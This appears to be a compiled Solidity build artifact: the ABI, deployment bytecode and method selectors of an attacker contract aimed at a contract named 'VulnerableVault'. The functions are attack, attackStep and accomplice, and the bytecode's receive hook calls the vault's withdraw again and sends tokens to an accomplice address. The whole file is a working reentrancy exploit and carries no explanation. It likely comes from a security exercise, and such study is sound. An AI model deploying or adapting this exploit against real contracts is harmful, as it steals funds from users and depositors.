{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"},{"name":"_accomplice","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"accomplice","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackStep","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b5060405161074e38038061074e83398181016040528101906100319190610115565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f5f6040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b6105ee806101605f395ff3fe60806040526004361061004d575f3560e01c806312065fe0146101965780637a164584146101c05780639e5faafc146101ea578063d12fd49a146101f4578063fbfa77cf1461021e57610192565b36610192575f600254036101905760016002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040518363ffffffff1660e01b81526004016100e792919061046d565b5f604051808303815f87803b1580156100fe575f5ffd5b505af1158015610110573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610179575f5ffd5b505af115801561018b573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156101a1575f5ffd5b506101aa610248565b6040516101b791906104a3565b60405180910390f35b3480156101cb575f5ffd5b506101d461024f565b6040516101e191906104a3565b60405180910390f35b6101f2610255565b005b3480156101ff575f5ffd5b5061020861039a565b60405161021591906104bc565b60405180910390f35b348015610229575f5ffd5b506102326103bf565b60405161023f9190610527565b60405180910390f35b5f47905090565b60025481565b670de0b6b3a76400003410156102a0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102979061059a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610306575f5ffd5b505af1158015610318573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610382575f5ffd5b505af1158015610394573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61040c826103e3565b9050919050565b61041c81610402565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61045761045261044d84610422565b610434565b61042b565b9050919050565b6104678161043d565b82525050565b5f6040820190506104805f830185610413565b61048d602083018461045e565b9392505050565b61049d8161042b565b82525050565b5f6020820190506104b65f830184610494565b92915050565b5f6020820190506104cf5f830184610413565b92915050565b5f6104ef6104ea6104e5846103e3565b610434565b6103e3565b9050919050565b5f610500826104d5565b9050919050565b5f610511826104f6565b9050919050565b61052181610507565b82525050565b5f60208201905061053a5f830184610518565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120657468657200000000000000000000005f82015250565b5f610584601583610540565b915061058f82610550565b602082019050919050565b5f6020820190508181035f8301526105b181610578565b905091905056fea264697066735822122087682d69c3d023f64042c5ab7f21995fd864a7cbd11fa04220cb74297ae94af364736f6c63430008210033","linkReferences":{}},"methodIdentifiers":{"accomplice()":"d12fd49a","attack()":"9e5faafc","attackStep()":"7a164584","getBalance()":"12065fe0","vault()":"fbfa77cf"},"id":19}